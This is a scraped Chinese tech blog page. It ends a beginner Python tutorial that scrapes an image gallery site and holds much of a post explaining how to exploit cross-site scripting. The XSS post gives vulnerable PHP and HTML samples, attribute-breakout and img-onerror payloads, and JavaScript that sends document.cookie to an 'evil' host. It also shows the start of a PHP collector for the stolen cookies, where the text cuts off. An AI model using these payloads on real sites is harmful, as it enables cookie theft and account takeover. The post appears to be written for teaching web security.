class="string">"D:\mzitu\\"</span>+path) ##切换到上面创建的文件夹</span><br><span class="line">    href = a[<span class="string">'href'</span>] #取出a标签的href 属性</span><br><span class="line">    html = requests.get(href, headers=headers) ##上面说过了</span><br><span class="line">    html_Soup = BeautifulSoup(html.text, <span class="string">'lxml'</span>) ##上面说过了</span><br><span class="line">    max_span = html_Soup.find(<span class="string">'div'</span>, class_=<span class="string">'pagenavi'</span>).find_all(<span class="string">'span'</span>)[<span class="number">-2</span>].get_text() ##查找所有的&lt;span&gt;标签获取第十个的&lt;span&gt;标签中的文本也就是最后一个页面了。</span><br><span class="line">    for page <span class="keyword">in</span> range(<span class="number">1</span>, int(max_span)+<span class="number">1</span>): ##不知道为什么这么用的小哥儿去看看基础教程吧</span><br><span class="line">        page_url = href + <span class="string">'/'</span> + str(page) ##同上</span><br><span class="line">        img_html = requests.get(page_url, headers=headers)</span><br><span class="line">        img_Soup = BeautifulSoup(img_html.text, <span class="string">'lxml'</span>)</span><br><span class="line">        img_url = img_Soup.find(<span class="string">'div'</span>, class_=<span class="string">'main-image'</span>).find(<span class="string">'img'</span>)[<span class="string">'src'</span>] ##这三行上面都说过啦不解释了哦</span><br><span class="line">        name = img_url[<span class="number">-9</span>:<span class="number">-4</span>] ##取URL 倒数第四至第九位 做图片的名字</span><br><span class="line">        img = requests.get(img_url, headers=headers)</span><br><span class="line">        f = open(name+<span class="string">'.jpg'</span>, <span class="string">'ab'</span>)##写入多媒体文件必须要 b 这个参数！！必须要！！</span><br><span class="line">        f.write(img.content) ##多媒体文件要是用conctent哦！</span><br><span class="line">        f.close()</span><br></pre>
                          </td>
                        </tr>
                      </table>
                    </figure>
                    <p>好了！！来运行一下 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028205004.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028205004.png" alt="QQ截图20161028205004"></a> 哈哈哈完美！！！以上完毕！下面我们来整理一下代码，弄个函数什么的提示下逼格！加点提示什么的 首先我们上面 requests 一共使用了三次，我们写一个函数复用 （别怕！一点都不难）</p>
                    <figure class="highlight ruby">
                      <table>
                        <tr>
                          <td class="gutter">
                            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                          </td>
                          <td class="code">
                            <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(url)</span></span><span class="symbol">:</span></span><br><span class="line">    headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>&#125;</span><br><span class="line">    content = requests.get(url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> content</span><br></pre>
                          </td>
                        </tr>
                      </table>
                    </figure>
                    <p>当调用 request 的时候会获取 URL 地址的网页然后返回获取到的 response （response 是啥？ 你理解成请求网页地址返回的源码就好了！ 注意：如果请求的是多媒体文件的话 response 返回的是二进制文件哦！） 哈哈！第一个就写好啦，简单吧！ 第二个是创建文件</p>
                    <figure class="highlight python">
                      <table>
                        <tr>
                          <td class="gutter">
                            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                          </td>
                          <td class="code">
                            <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir</span><span class="params">(self, path)</span>:</span></span><br><span class="line">        path = path.strip()</span><br><span class="line">        isExists = os.path.exists(os.path.join(<span class="string">"D:\mzitu"</span>, path))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isExists:</span><br><span class="line">            print(<span class="string">u'建了一个名字叫做'</span>, path, <span class="string">u'的文件夹！'</span>)</span><br><span class="line">            os.makedirs(os.path.join(<span class="string">"D:\mzitu"</span>, path))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">u'名字叫做'</span>, path, <span class="string">u'的文件夹已经存在了！'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre>
                          </td>
                        </tr>
                      </table>
                    </figure>
                    <p>调用 mkdir 这个函数时，会在 D:\mzitu 文件下创建一个 path 这个<strong>参数</strong>的文件夹（是参数 不是 path 哦！就是你调用的时候传递什么参数给这个函数 就创建什么文件夹！这个函数可以存着，下载东西到本地 都可以用），另外一个好处就是在文件夹已经存在的情况下不会报错退出程序哦！ 不使用就会诶！ 好啦 剩下的我就一股脑的写出来了！ <strong>PS: 感谢<a href="http://weibo.com/nenyah" target="_blank" rel="noopener">Lucibriel</a>的提醒！（因为我的程序就在 D 盘，所以疏忽了 程序没在 D 盘 os.chdir() 不能切换目录的问题、已经就改过来了；非常抱歉。）</strong></p>
                    <figure class="highlight python">
                      <table>
                        <tr>
                          <td class="gutter">
                            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre>
                          </td>
                          <td class="code">
                            <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mzitu</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>&#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">all_url</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        html = self.request(url)<span class="comment">##调用request函数把套图地址传进去会返回给我们一个response</span></span><br><span class="line">        all_a = BeautifulSoup(html.text, <span class="string">'lxml'</span>).find(<span class="string">'div'</span>, class_=<span class="string">'all'</span>).find_all(<span class="string">'a'</span>)</span><br><span class="line">        <span class="comment"># 页面更改 多了一个早期图片 需要删掉（小伙伴们 可以自己尝试处理一下这个页面）</span></span><br><span class="line">        all_a.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="comment"># 上面是删掉列表的第一个元素</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> all_a:</span><br><span class="line">            title = a.get_text()</span><br><span class="line">            print(<span class="string">u'开始保存：'</span>, title) <span class="comment">##加点提示不然太枯燥了</span></span><br><span class="line">            path = str(title).replace(<span class="string">"?"</span>, <span class="string">'_'</span>) <span class="comment">##我注意到有个标题带有 ？  这个符号Windows系统是不能创建文件夹的所以要替换掉</span></span><br><span class="line">            self.mkdir(path) <span class="comment">##调用mkdir函数创建文件夹！这儿path代表的是标题title哦！！！！！不要糊涂了哦！</span></span><br><span class="line">            href = a[<span class="string">'href'</span>]</span><br><span class="line">            self.html(href) <span class="comment">##调用html函数把href参数传递过去！href是啥还记的吧？ 就是套图的地址哦！！不要迷糊了哦！</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">html</span><span class="params">(self, href)</span>:</span>   <span class="comment">##这个函数是处理套图地址获得图片的页面地址</span></span><br><span class="line">        html = self.request(href)</span><br><span class="line">        self.headers[<span class="string">'referer'</span>] = href</span><br><span class="line">        max_span = BeautifulSoup(html.text, <span class="string">'lxml'</span>).find(<span class="string">'div'</span>, class_=<span class="string">'pagenavi'</span>).find_all(<span class="string">'span'</span>)[<span class="number">-2</span>].get_text()</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> range(<span class="number">1</span>, int(max_span) + <span class="number">1</span>):</span><br><span class="line">            page_url = href + <span class="string">'/'</span> + str(page)</span><br><span class="line">            self.img(page_url) <span class="comment">##调用img函数</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">img</span><span class="params">(self, page_url)</span>:</span> <span class="comment">##这个函数处理图片页面地址获得图片的实际地址</span></span><br><span class="line">        img_html = self.request(page_url)</span><br><span class="line">        img_url = BeautifulSoup(img_html.text, <span class="string">'lxml'</span>).find(<span class="string">'div'</span>, class_=<span class="string">'main-image'</span>).find(<span class="string">'img'</span>)[<span class="string">'src'</span>]</span><br><span class="line">        self.save(img_url)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self, img_url)</span>:</span> <span class="comment">##这个函数保存图片</span></span><br><span class="line">        name = img_url[<span class="number">-9</span>:<span class="number">-4</span>]</span><br><span class="line">        img = self.request(img_url)</span><br><span class="line">        f = open(name + <span class="string">'.jpg'</span>, <span class="string">'ab'</span>)</span><br><span class="line">        f.write(img.content)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mkdir</span><span class="params">(self, path)</span>:</span> <span class="comment">##这个函数创建文件夹</span></span><br><span class="line">        path = path.strip()</span><br><span class="line">        isExists = os.path.exists(os.path.join(<span class="string">"D:\mzitu"</span>, path))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isExists:</span><br><span class="line">            print(<span class="string">u'建了一个名字叫做'</span>, path, <span class="string">u'的文件夹！'</span>)</span><br><span class="line">            os.makedirs(os.path.join(<span class="string">"D:\mzitu"</span>, path))</span><br><span class="line">            os.chdir(os.path.join(<span class="string">"D:\mzitu"</span>, path)) <span class="comment">##切换到目录</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">u'名字叫做'</span>, path, <span class="string">u'的文件夹已经存在了！'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, url)</span>:</span> <span class="comment">##这个函数获取网页的response 然后返回</span></span><br><span class="line">        content = requests.get(url, headers=self.headers)</span><br><span class="line">        <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">Mzitu = mzitu() <span class="comment">##实例化</span></span><br><span class="line">Mzitu.all_url(<span class="string">'http://www.mzitu.com/all'</span>) <span class="comment">##给函数all_url传入参数  你可以当作启动爬虫（就是入口）</span></span><br></pre>
                          </td>
                        </tr>
                      </table>
                    </figure>
                    <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028215007.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028215007-1024x646.png" alt="QQ截图20161028215007"></a> 完美！！好啦！结束了！ 如果大家觉得还能看懂、还行的话 我后面在写点儿其他的。 给大家看看我的成果 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028220006.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028220006.png" alt="QQ截图20161028220006"></a> 最后感谢 mzitu.com 的站长。 后续几篇：</p>
                    <h1 id="小白爬虫第二弹之健壮的小爬虫"><a href="#小白爬虫第二弹之健壮的小爬虫" class="headerlink" title="小白爬虫第二弹之健壮的小爬虫"></a><a href="http://cuiqingcai.com/3256.html">小白爬虫第二弹之健壮的小爬虫</a></h1>
                    <h1 id="小白爬虫第三弹之去重去重"><a href="#小白爬虫第三弹之去重去重" class="headerlink" title="小白爬虫第三弹之去重去重"></a><a href="http://cuiqingcai.com/3314.html">小白爬虫第三弹之去重去重</a></h1>
                    <h1 id="小白爬虫第四弹之爬虫快跑（多进程-多线程）"><a href="#小白爬虫第四弹之爬虫快跑（多进程-多线程）" class="headerlink" title="小白爬虫第四弹之爬虫快跑（多进程+多线程）"></a><a href="http://cuiqingcai.com/3363.html">小白爬虫第四弹之爬虫快跑（多进程+多线程）</a></h1>
                    <h1 id="小白进阶之-Scrapy-第一篇"><a href="#小白进阶之-Scrapy-第一篇" class="headerlink" title="小白进阶之 Scrapy 第一篇"></a><strong><a href="http://cuiqingcai.com/3472.html">小白进阶之 Scrapy 第一篇</a></strong></h1>
                    <h1 id="小白进阶之-Scrapy-第二篇（登录篇）"><a href="#小白进阶之-Scrapy-第二篇（登录篇）" class="headerlink" title="小白进阶之 Scrapy 第二篇（登录篇）"></a><a href="http://cuiqingcai.com/3952.html">小白进阶之 Scrapy 第二篇（登录篇）</a></h1>
                    <h1 id="Scrapy-分布式的前篇–让-redis-和-MongoDB-安全点"><a href="#Scrapy-分布式的前篇–让-redis-和-MongoDB-安全点" class="headerlink" title="Scrapy 分布式的前篇–让 redis 和 MongoDB 安全点"></a><a href="http://cuiqingcai.com/4020.html">Scrapy 分布式的前篇–让 redis 和 MongoDB 安全点</a></h1>
                    <h1 id="小白进阶之-Scrapy-第三篇基于-Scrapy-Redis-的分布式以及-cookies-池"><a href="#小白进阶之-Scrapy-第三篇基于-Scrapy-Redis-的分布式以及-cookies-池" class="headerlink" title="小白进阶之 Scrapy 第三篇基于 Scrapy-Redis 的分布式以及 cookies 池"></a><a href="http://cuiqingcai.com/4048.html">小白进阶之 Scrapy 第三篇基于 Scrapy-Redis 的分布式以及 cookies 池</a></h1>
                    </p>
                  </div>
                </div>
                <div class="post-meta">
                  <span class="post-meta-item">
                    <span class="post-meta-item-icon">
                      <i class="far fa-user"></i>
                    </span>
                    <span class="post-meta-item-text">作者</span>
                    <span><a href="/authors/哎哟卧槽" class="author" itemprop="url" rel="index">哎哟卧槽</a></span>
                  </span>
                  <span class="post-meta-item">
                    <span class="post-meta-item-icon">
                      <i class="far fa-calendar"></i>
                    </span>
                    <span class="post-meta-item-text">发表于</span>
                    <time title="创建时间：2016-10-28 22:01:28" itemprop="dateCreated datePublished" datetime="2016-10-28T22:01:28+08:00">2016-10-28</time>
                  </span>
                  <span id="/3179.html" class="post-meta-item leancloud_visitors" data-flag-title="小白爬虫第一弹之抓取妹子图" title="阅读次数">
                    <span class="post-meta-item-icon">
                      <i class="fa fa-eye"></i>
                    </span>
                    <span class="post-meta-item-text">阅读次数：</span>
                    <span class="leancloud-visitors-count"></span>
                  </span>
                  <span class="post-meta-item" title="本文字数">
                    <span class="post-meta-item-icon">
                      <i class="far fa-file-word"></i>
                    </span>
                    <span class="post-meta-item-text">本文字数：</span>
                    <span>15k</span>
                  </span>
                  <span class="post-meta-item" title="阅读时长">
                    <span class="post-meta-item-icon">
                      <i class="far fa-clock"></i>
                    </span>
                    <span class="post-meta-item-text">阅读时长 &asymp;</span>
                    <span>14 分钟</span>
                  </span>
                </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3133.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> JavaScript <i class="label-arrow"></i>
                  </a>
                  <a href="/3133.html" class="post-title-link" itemprop="url">Web安全学习一之XSS漏洞的利用</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <h2 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h2>
                  <p>XSS 意为跨站脚本攻击(Cross Site Scripting)，缩写应该是CSS，但是已经有了一个层叠样式表(Cascading Style Sheets)，所以就叫它XSS了。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的，最常见的就是拿到攻击者的 Cookie 然后就可以登录别人的账号了。</p>
                  <h2 id="XSS实例"><a href="#XSS实例" class="headerlink" title="XSS实例"></a>XSS实例</h2>
                  <p>最简单的形式就是从URL中直接插入恶意的 JavaScript 代码，最简单的实例如下：</p>
                  <figure class="highlight xml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">$input = $_GET[<span class="string">'info'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $input;</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>服务端接收到了数据并执行了输出操作。这样的话就完全可以利用了，你可以向参数输入任意代码。 这个服务端的测试用例网址是 <a href="http://res.cuiqingcai.com/hack/xss1.php" target="_blank" rel="noopener">http://res.cuiqingcai.com/hack/xss1.php</a> 你可以直接在参数后面加入 JavaScript 代码，例如 <a href="http://res.cuiqingcai.com/hack/xss1.php?info=%3Cscript%3Ealert(%27hello%27" target="_blank" rel="noopener">http://res.cuiqingcai.com/hack/xss1.php?info=%3Cscript%3Ealert(%27hello%27)%3C/script%3E</a>%3C/script%3E) 直接打开便实现了最简单的 XSS 攻击，不过有的浏览器对此种攻击方式执行了过滤，例如 Chrome, Firefox。有的未执行过滤的浏览器是可以正常演示的。正常的结果应该是输出一个提示框。 接下来再演示另一种攻击方式。 测试网址是 <a href="http://res.cuiqingcai.com/hack/xss2.html" target="_blank" rel="noopener">http://res.cuiqingcai.com/hack/xss2.html</a> 源代码如下</p>
                  <figure class="highlight xml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>TEST XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> text = <span class="built_in">document</span>.getElementById(<span class="string">'text'</span>).value;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> new_text = <span class="string">'&lt;a href="'</span> + text + <span class="string">'"&gt;test&lt;/a&gt;'</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(new_text);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">'content'</span>).innerHTML = new_text;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"提交"</span> <span class="attr">onclick</span>=<span class="string">"test()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>现在有一个输入框，点击按钮之后会将输入框的内容提取出来，然后拼凑到超链接标签里。在这里也可以执行XSS攻击。 比如输入</p>
                  <figure class="highlight groovy">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="string">javascript:</span><span class="keyword">void</span>(<span class="number">0</span>)<span class="string">" onclick=alert('ssss') "</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>提交之后会出现一个超链接，点击之后就可以执行你输入的代码，这次就弹出一个输入框。 当然你也可以插入一张图片，用 onerror 属性定义方法</p>
                  <figure class="highlight xml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">class</span>=<span class="string">"</span></span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>也可以达到同样的效果。 那么接下来来了，我们可以利用这个漏洞来盗取Cookie。 盗取Cookie可以这样，在本地执行一个JavaScript脚本，然后请求恶意网址，恶意网址的参数就是本网址通过 document.cookie 获取的本地cookie，这样 cookie 就保存在恶意网站上了。 这样的话，我们可以写一个脚本。</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.src = <span class="string">'http://evil.cuiqingcai.com/cookie.php?url='</span>+<span class="built_in">escape</span>(<span class="built_in">window</span>.location.href)+<span class="string">'&amp;content='</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line">img.style = <span class="string">'display:none'</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>创建一张图片，然后图片的链接是一个恶意网址加当前的cookie，然后添加到网页里。这样，新增加的一个网页便会请求这个src，实现访问。 然后还是原来的实例，我们想在代码里执行这段JavaScript，那怎么办呢？直接创建一个script节点引用？ 先把这段js保存成 <a href="http://evil.cuiqingcai.com/cookie.js" target="_blank" rel="noopener">http://evil.cuiqingcai.com/cookie.js</a>，试一下。 输入</p>
                  <figure class="highlight xml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">javascript:void(0)"&gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//evil.cuiqingcai.com/cookie.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"</span></span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>测试之后，发现并不能行。原因是插入script标签后，并不会自动请求这个链接。 这样我们就需要再次借助图片这个神奇的东西来帮忙了。 输入</p>
                  <figure class="highlight dart">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">javascript:<span class="keyword">void</span>(<span class="number">0</span>)<span class="string">"&gt;&lt;/a&gt;&lt;img src=# onerror="</span><span class="built_in">document</span>.body.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'script'</span>)).src=<span class="string">'//evil.cuiqingcai.com/cookie.js'</span><span class="string">"&gt;&lt;a class="</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里创建了一张图片，然后利用 onerror 方法插入了一个 script 标签，引入这个JS文件，这样就可以正常加载了。 嗯，那么这样就做到了将cookie传递给一个恶意网址。真正的盗取是在这里的。 那么 <a href="http://evil.cuiqingcai.com/cookie.php" target="_blank" rel="noopener">http://evil.cuiqingcai.com/cookie.php</a> 的内容是什么？</p>
                  <figure class="highlight xml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"></span><br><span class="line"><span class="php">$_SESSION[<span class="string">'attempt'</span>] = <span class="keyword">isset</span>($_SESSION[<span class="string">'attempt'</span>])?$_SESSION[<span class="string">'attempt'</span>]:<span class="number">0</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$_SESSION[<span class="string">'attempt'</span>] += <span class="number">1</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($_SESSION[<span class="string">'attempt'</span>] &gt;= <span class="number">100</span>) &#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">die</span>(<span class="string">"Too Frequent"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">""</span>, <span class="string">"evil"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($mysqli-&gt;connect_errno) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Failed to connect to MySQL: ("</span> . $mysqli-&gt;connect_errno . <span class="string">") "</span> . $mysqli-&gt;connect_error;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$url = $_GET[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php">$content = $_GET[<span class="string">'content'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">$time = date(<span class="string">"Y-m-d H:i:s"</span>, time());</span></span><br><span class="line"></span><br><span class="line"><span class="php">$items = explode(<span class="string">";"</span>, $content);</span></span><br><span class="line"></span><br><span class="line"><span class="php">$js = <span class="string">''</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">foreach</span> ($items <span class="keyword">as</span> $item) &#123;</span></span><br><span class="line"><span class="php">	$js .= (<span class="string">"document.cookie='"</span>.trim($item).<span class="string">"';"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($url &amp;&amp; $content &amp;&amp; $stmt = $mysqli-&gt;prepare(<span 